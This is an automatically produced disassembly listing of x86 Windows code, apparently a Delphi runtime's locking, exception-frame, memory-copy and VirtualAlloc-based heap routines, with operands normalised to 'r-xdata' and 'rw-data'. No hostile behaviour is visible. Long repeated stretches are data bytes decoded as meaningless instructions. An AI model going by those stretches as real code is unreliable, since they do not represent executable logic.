movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
movzx eax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
movzx eax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_4454e4
sete al
xor eax eax
jmp r-xdata
sub_445010
push ebx
movzx ebx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_445010
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_44505c
add esp 0xfffffff8
test dl dl
je r-xdata
movzx eax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_445010
pop ecx
pop edx
retn
sub_445098
dec [ eax ]
inc ebx
add [ eax ] cl
push esi
popad
jb r-xdata
cmp al [ eax ]
add bl ch
out dx al
pop esi
pop ebx
pop ebp
retn
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
movzx eax [ esi ]
call sub_44534c
test al al
je r-xdata
nop
nop
mov eax ebx
call sub_4452cc
movzx eax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4450a8
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_445109
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_44af28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4481b0
sub_445158
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4452cc
lea edx [ ebp - 0x8 ]
movzx eax [ esi ]
call sub_44534c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4451ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
movzx eax [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
movzx eax [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4451e4
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4452cc
movzx eax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_445220
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44873c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_445283
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44528a
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_445324
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_448278
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_44534c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4453f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_44af28
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_445408
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4454ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4454ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_44af30
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4454b4
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx ]
call sub_448088
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_43501c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4454f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_445563
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44556a
retn
call sub_4450a8
push rw-data
call DeleteCriticalSection
mov eax rw-data
call sub_43ef1c
mov eax rw-data
call j_sub_449348
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_44a7e8
mov eax rw-data
mov edx [ r-xdata ]
call sub_44b0fc
sub_44556c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44560d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445614
retn
mov eax rw-data
call sub_445004
mov eax sub_43ec04
mov [ rw-data ] eax
mov eax sub_43e754
mov [ rw-data ] eax
mov edx sub_43e664
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_43ef1c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_444abc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_43f250
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4426e0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_442f38
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4456c8
adc al [ esi ]
jae r-xdata
inc esp
push edi
jb r-xdata
add [ esi - 0x50 ] al
push edi
je r-xdata
inc esp
add [ edi ] al
outsb
aam 0x56
inc esp
add [ edi + eax ] cl
push esi
popad
jb r-xdata
inc edx
outsd
jb r-xdata
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
insd
add [ eax ] al
push edi
inc esp
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi + 0x57 ] si
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
popad
jae r-xdata
popad
outsb
and [ fs : ebp + 0x64 ] al
imul esi [ ecx + ebp * 2 + 0x6f ] 0x6328206e
sub [ eax ] esp
xor dh [ eax ]
xor [ eax ] dh
sub eax 0x30303220
cmp [ eax ] ah
push eax
imul esp [ ebp + 0x72 ] 0x6c206572
and [ gs : edx + 0x69 ] dl
arpl [ eax + 0x65 ] bp
and [ edi ] ch
and [ eax + 0x72 ] dl
outsd
jae r-xdata
insb
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x70 ] si
mov al 0x57
jb r-xdata
inc esp
add [ ecx ] al
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 2 + 0x57 ] si
nop
nop
cmp [ edi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
insb
insb
and [ edx + 0x6c ] ah
outsd
arpl [ ebx + 0x20 ] bp
insb
popad
imul esi [ ebx + 0x20 ] 0x61
jb r-xdata
outsd
arpl [ ebx + 0x75 ] sp
jb r-xdata
and [ ebx + 0x69 ] dh
imul ebp [ edi + 0x6e ] 0x53206c61
outsd
je r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] dh
inc esp
add [ edi + edx * 2 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
outsb
je r-xdata
jb r-xdata
outsb
jpe r-xdata
cmp cl [ 0x6854000a ]
and [ gs : ebx + 0x69 ] dh
jns r-xdata
and [ cs : eax ] al
add [ eax ] al
add [ eax + ebp * 2 + 0x65 ] dl
and [ ebp + 0x6e ] dh
js r-xdata
add [ eax ] al
jae r-xdata
arpl [ gs : ebp + 0x64 ] si
and [ ebp + 0x61 ] ch
popad
jb r-xdata
xor al 0x58
inc esp
add [ eax ] dl
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax - 0x47 ] bl
inc esp
add [ ecx + edi * 4 + 0x44 ] ah
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ ecx + edi * 4 + 0x44 ] dh
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x11004481 ] ah
push esp
dec ecx
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
nop
nop
mov [ esi + 0x44 ] dl
add [ ecx ] al
add al 0x42
jns r-xdata
or [ ecx + 0x488b084a ] cl
or al 0x89
dec edx
or al 0x8b
dec eax
adc [ ecx + 0x488b104a ] cl
adc al 0x8b
inc eax
add [ 0x5500000a ] cl
outsb
js r-xdata
outsb
add [ bx + si ] al
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
mov [ edx + 0xc ] ecx
jae r-xdata
ja r-xdata
arpl [ gs : ebp + 0x64 ] si
and [ ebx + 0x6d ] dh
popad
sbb [ ecx + 0x4289144a ] cl
sbb bl al
nop
nop
nop
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
mov ecx [ eax + 0x20 ]
mov [ edx + 0x20 ] ecx
fistp [ edx + 0x18 ]
arpl [ gs : ebp + 0x64 ] si
and [ ebp + 0x65 ] cl
insb
popad
jb r-xdata
outsd
and [ ebp + 0x6e ] dh
js r-xdata
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
jae r-xdata
and [ ebp + 0x76 ] al
insb
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
push edi
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
insd
and [ eax ] al
add [ eax ] al
add [ ebp + 0x6e ] dl
imul ebp [ esi + 0x6f ] 0x77
outsb
mov [ edx + 0x10 ] eax
retn
add [ ecx + 0x6e ] al
jae r-xdata
sbb [ ebx + 0x4a892048 ] cl
and bh bl
jpe r-xdata
and [ ebp + 0x61 ] cl
imul eax [ eax ] 0x0
or [ ecx + 0x4488b0a ] cl
mov eax [ eax + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] eax
retn
outsd
arpl [ ebx + 0x73 ] bp
and [ ecx + 0x72 ] ah
and [ gs : edx + 0x6c ] ah
outsd
jb r-xdata
je r-xdata
outsb
je r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
push ebx
je r-xdata
push 0x28488b20
mov [ edx + 0x28 ] ecx
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
je r-xdata
imul esp [ ebp + 0x64 ] 0x20
insd
imul esi [ fs : ebp + 0x6d ] 0x646e6120
and [ ecx + 0x72 ] ch
and [ fs : ebp + 0x61 ] ch
add [ ecx + 0x6e ] al
and [ ebp + 0x6e ] dh
js r-xdata
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x7004481 ] ah
inc esp
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
dec eax
add al 0x89
dec edx
add al 0x8b
dec eax
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
imul ebp [ esi + 0x67 ] 0x6e550000
dec edx
adc [ ebx + 0x408b1448 ] cl
and [ fs : ebp + 0x65 ] cl
and [ gs : bp + si + 0x6c ] ah
insd
and [ ecx + 0x6e ] ah
and [ fs : ecx + 0x72 ] ch
arpl [ gs : ebp + 0x64 ] si
and [ ebp + 0x65 ] ch
insd
outsd
jb r-xdata
cmp ah [ gs : eax ]
add [ eax ] al
add [ eax ] al
and [ edx + 0x79 ] ah
je r-xdata
and [ ebp + 0x61 ] ch
imul esp [ eax ] 0x68
sub_44578f
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_448278
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4457b0
xchg ecx eax
push edi
inc esp
add [ ebx - 0x5affbba9 ] bl
push edi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov al 0x57
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] dh
inc esp
add [ edi + edx * 2 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x58
inc esp
add [ eax ] dl
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax - 0x47 ] bl
inc esp
add [ ecx + edi * 4 + 0x44 ] ah
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ ecx + edi * 4 + 0x44 ] dh
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x11004481 ] ah
push esp
dec ecx
outsb
je r-xdata
inc edx
outsd
jb r-xdata
jb r-xdata
popad
jae r-xdata
popad
outsb
and [ fs : ebp + 0x64 ] al
imul esi [ ecx + ebp * 2 + 0x6f ] 0x6328206e
sub [ eax ] esp
xor dh [ eax ]
xor [ eax ] dh
sub eax 0x30303220
cmp [ eax ] ah
push eax
imul esp [ ebp + 0x72 ] 0x6c206572
and [ gs : edx + 0x69 ] dl
arpl [ eax + 0x65 ] bp
and [ edi ] ch
and [ eax + 0x72 ] dl
outsd
jae r-xdata
insb
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x70 ] si
insb
insb
and [ edx + 0x6c ] ah
outsd
arpl [ ebx + 0x20 ] bp
insb
popad
imul esi [ ebx + 0x20 ] 0x61
jb r-xdata
outsd
arpl [ ebx + 0x75 ] sp
jb r-xdata
and [ ebx + 0x69 ] dh
imul ebp [ edi + 0x6e ] 0x53206c61
outsd
je r-xdata
outsb
jpe r-xdata
cmp cl [ 0x6854000a ]
and [ gs : ebx + 0x69 ] dh
jns r-xdata
and [ cs : eax ] al
add [ eax ] al
add [ eax + ebp * 2 + 0x65 ] dl
and [ ebp + 0x6e ] dh
js r-xdata
add [ eax ] al
jae r-xdata
arpl [ gs : ebp + 0x64 ] si
and [ ebp + 0x61 ] ch
popad
jb r-xdata
or [ ecx + 0x488b084a ] cl
or al 0x89
dec edx
or al 0x8b
dec eax
adc [ ecx + 0x488b104a ] cl
adc al 0x8b
inc eax
add [ 0x5500000a ] cl
outsb
js r-xdata
outsb
add [ bx + si ] al
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
mov [ edx + 0xc ] ecx
jae r-xdata
ja r-xdata
arpl [ gs : ebp + 0x64 ] si
and [ ebx + 0x6d ] dh
popad
sbb [ ecx + 0x4289144a ] cl
sbb bl al
nop
nop
nop
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
mov ecx [ eax + 0x20 ]
mov [ edx + 0x20 ] ecx
fistp [ edx + 0x18 ]
arpl [ gs : ebp + 0x64 ] si
and [ ebp + 0x65 ] cl
insb
popad
jb r-xdata
outsd
and [ ebp + 0x6e ] dh
js r-xdata
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
jae r-xdata
and [ ebp + 0x76 ] al
insb
outsd
jo r-xdata
insd
and [ eax ] al
add [ eax ] al
add [ ebp + 0x6e ] dl
imul ebp [ esi + 0x6f ] 0x77
outsb
mov [ edx + 0x10 ] eax
retn
add [ ecx + 0x6e ] al
jae r-xdata
sbb [ ebx + 0x4a892048 ] cl
and bh bl
jpe r-xdata
and [ ebp + 0x61 ] cl
imul eax [ eax ] 0x0
or [ ecx + 0x4488b0a ] cl
mov eax [ eax + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] eax
retn
outsd
arpl [ ebx + 0x73 ] bp
and [ ecx + 0x72 ] ah
and [ gs : edx + 0x6c ] ah
outsd
jb r-xdata
je r-xdata
outsb
je r-xdata
push ebx
je r-xdata
push 0x28488b20
mov [ edx + 0x28 ] ecx
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
je r-xdata
imul esp [ ebp + 0x64 ] 0x20
insd
imul esi [ fs : ebp + 0x6d ] 0x646e6120
and [ ecx + 0x72 ] ch
and [ fs : ebp + 0x61 ] ch
add [ ecx + 0x6e ] al
and [ ebp + 0x6e ] dh
js r-xdata
dec eax
add al 0x89
dec edx
add al 0x8b
dec eax
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
imul ebp [ esi + 0x67 ] 0x6e550000
dec edx
adc [ ebx + 0x408b1448 ] cl
and [ fs : ebp + 0x65 ] cl
and [ gs : bp + si + 0x6c ] ah
insd
and [ ecx + 0x6e ] ah
and [ fs : ecx + 0x72 ] ch
arpl [ gs : ebp + 0x64 ] si
and [ ebp + 0x65 ] ch
insd
outsd
jb r-xdata
cmp ah [ gs : eax ]
add [ eax ] al
add [ eax ] al
and [ edx + 0x79 ] ah
je r-xdata
and [ ebp + 0x61 ] ch
imul esp [ eax ] 0x68
sub_445860
push ebx
add esp 0xffffffbc
mov ebx 0xa
mov [ esp ] 0x44
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_445a10
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov [ edx + 0xc ] ecx
mov ecx [ eax + 0x10 ]
mov [ edx + 0x10 ] ecx
mov ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov [ edx + 0x14 ] ecx
mov [ edx + 0x18 ] eax
retn
sub_445a5c
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
mov ecx [ eax + 0x28 ]
mov [ edx + 0x28 ] ecx
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_445a80
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
mov ecx [ eax + 0x30 ]
mov [ edx + 0x30 ] ecx
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_445aac
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
mov ecx [ eax + 0x38 ]
mov [ edx + 0x38 ] ecx
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_445adc
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
fild [ eax + 0x38 ]
mov ecx [ eax + 0x40 ]
mov [ edx + 0x40 ] ecx
fistp [ edx + 0x38 ]
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_445b14
sub ecx 0xc
add eax ecx
add edx ecx
neg ecx
jns r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
mov eax [ ecx + eax + 0x8 ]
mov [ ecx + edx + 0x8 ] eax
retn
fild [ ecx + eax ]
fild [ ecx + eax + 0x8 ]
fistp [ ecx + edx + 0x8 ]
fistp [ ecx + edx ]
add ecx 0x10
js r-xdata
sub_445b60
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
cmp ecx edx
mov [ ecx ] edx
mov [ edx + 0x4 ] ecx
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
retn
mov eax 0xfffffffe
mov ecx edx
rol eax cl
and [ rw-data ] eax
retn
sub_445ba0
sub edx 0xb30
shr edx 0x8
sub edx 0x3ff
sbb ecx ecx
and edx ecx
add edx 0x3ff
lea ecx [ edx * 8 + rw-data ]
mov edx [ ecx + 0x4 ]
cmp edx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ ecx + 0x4 ] eax
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0x1
shl eax cl
or [ edx * 4 + rw-data ] eax
mov eax 0x1
mov ecx edx
shl eax cl
or [ rw-data ] eax
retn
retn
sub_445c00
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
test [ eax - 0x4 ] 0x1
jne r-xdata
retn
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
cmp edx 0xb30
jb r-xdata
or [ eax - 0x4 ] 0x8
mov edx [ rw-data ]
sub eax edx
mov ecx [ rw-data ]
sub eax ecx
add edx ecx
jmp r-xdata
call sub_445b60
mov eax [ rw-data ]
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
retn
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jae sub_445ba0
sub_445c6c
push ebx
mov ebx eax
call sub_445c00
push 0x4
push 0x1000
push 0x13fff0
push 0x0
call VirtualAlloc
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov ecx eax
mov [ ecx ] rw-data
mov [ rw-data ] eax
mov [ ecx + 0x4 ] edx
mov [ edx ] eax
mov edx eax
add edx 0x13fff0
mov ecx edx
sub ecx 0x4
mov [ ecx ] 0x2
mov ecx 0x13ffe0
sub ecx ebx
mov [ rw-data ] ecx
sub edx ebx
mov eax edx
mov [ rw-data ] eax
or ebx 0x2
mov edx eax
sub edx 0x4
mov [ edx ] ebx
pop ebx
retn
sub_445ce4
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp r-xdata
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_4459d4
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call Sleep
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_4459d4
test al al
je r-xdata
push 0xa
call Sleep
sub_445e34
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov edi eax
mov eax edi
sub eax 0x4
mov eax [ eax ]
mov ebx eax
and ebx 0xfffffff0
sub ebx 0x14
cmp ebx esi
jae r-xdata
shr ebx 0x1
cmp esi ebx
jb r-xdata
mov edx ebx
shr edx 0x2
add edx ebx
cmp edx esi
jbe r-xdata
mov eax esi
call sub_445f80
mov ebx eax
test ebx ebx
je r-xdata
mov ebx edi
sub edi 0x10
mov [ edi + 0x8 ] esi
jmp r-xdata
mov ebp esi
mov ebp edx
jmp r-xdata
mov eax ebx
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp esi 0x40a2c
jbe r-xdata
mov eax ebp
call sub_445f80
mov ebx eax
test ebx ebx
je r-xdata
and [ esp + 0x10 ] 0xffff0000
